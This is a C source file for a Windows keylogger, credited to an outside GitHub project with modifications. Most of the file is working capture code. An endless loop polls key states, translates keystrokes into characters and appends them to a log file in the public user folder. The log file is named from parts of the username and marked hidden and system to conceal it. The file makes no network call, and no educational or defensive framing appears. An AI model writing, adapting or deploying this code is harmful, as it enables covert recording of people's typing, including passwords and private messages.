/*
Keylogger 
Based on the implementation by abhijithb200
Original source: https://github.com/abhijithb200/Keylogger/blob/main/keylogger.c
With modifications
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winkeylog.h>
char KEY_LOG_FILE[MAX_PATH];
void getPath(char* outPath, size_t size) {
    char username[256];
    DWORD userSize = sizeof(username);
    char slicedName[10];
    if (GetUserNameA(username, &userSize)) {
        int len = (int)strlen(username);
        int firstPart = (len < 5) ? len : 5;
        char prefix[6] = {0};
        strncpy(prefix, username, firstPart);
        char suffix[4] = {0};
        if (len >= 3) {
            strcpy(suffix, username + (len - 3));
        } else {
            strcpy(suffix, username); 
        }
        snprintf(slicedName, sizeof(slicedName), "%s%s", prefix, suffix);
    } else {
        strcpy(slicedName, "unknown");
    }
    snprintf(outPath, size, "C:\\Users\\Public\\%s_log.txt", slicedName);
}

DWORD WINAPI logKey(LPVOID lpParam) {
    getPath(KEY_LOG_FILE, sizeof(KEY_LOG_FILE));
	FILE *f;
	f = fopen(KEY_LOG_FILE, "w");
	fclose(f);
	int vkey, last_key_state[0xFF];
	int isCAPSLOCK, isNUMLOCK;
	int isL_SHIFT, isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[] = ")!@#$%^&*(";
	char chars_vn[] = ";=,-./`";
	char chars_vs[] = ":+<_>?~";
	char chars_va[] = "[\\]\';";
	char chars_vb[] = "{|}\"";
	FILE *kh;
	for (vkey = 0; vkey < 0xFF; vkey++) {
		last_key_state[vkey] = 0;
	}
	while (TRUE) {
		Sleep(1);
		isCAPSLOCK = (GetAsyncKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
		isNUMLOCK = (GetAsyncKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
		isL_SHIFT = (GetAsyncKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
		isR_SHIFT = (GetAsyncKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;
		for (vkey = 0; vkey < 0xFF; vkey++) {
			isPressed = (GetAsyncKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
			showKey = (char)vkey;
			if (isPressed == 1 && last_key_state[vkey] == 0) {
				if (vkey >= 0x41 && vkey <= 0x5A) {
					if (isCAPSLOCK == 0) {
						if (isL_SHIFT == 0 && isR_SHIFT == 0) {
							showKey = (char)(vkey + 0x20);
						}
					}
					else if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = (char)(vkey + 0x20);
					}
				}
				else if (vkey >= 0x30 && vkey <= 0x39) {
					if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = NUMCHAR[vkey - 0x30];
					}
				}
				else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1) {
					showKey = (char)(vkey - 0x30);
				}
				else if (vkey >= 0xBA && vkey <= 0xC0) {
					if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = chars_vs[vkey - 0xBA];
					} else {
						showKey = chars_vn[vkey - 0xBA];
					}
				} else if (vkey >= 0xDB && vkey <= 0xDF) {
					if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = chars_vb[vkey - 0xDB];
					} else {
						showKey = chars_va[vkey - 0xDB];
					}
				}
				else if (vkey == 0x0D) {
					showKey = (char)0x0A;
				} else if (vkey >= 0x6A && vkey <= 0x6F) {
					showKey = (char)(vkey - 0x40);
				} else if (vkey != 0x20 && vkey != 0x09) {
					showKey = (char)0x00;
				}
				if (showKey != (char)0x00) {
					kh = fopen(KEY_LOG_FILE, "a");
					putc(showKey, kh);
					fclose(kh);
					SetFileAttributesA(KEY_LOG_FILE, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
				}
			}
			last_key_state[vkey] = isPressed;
		}
	}
}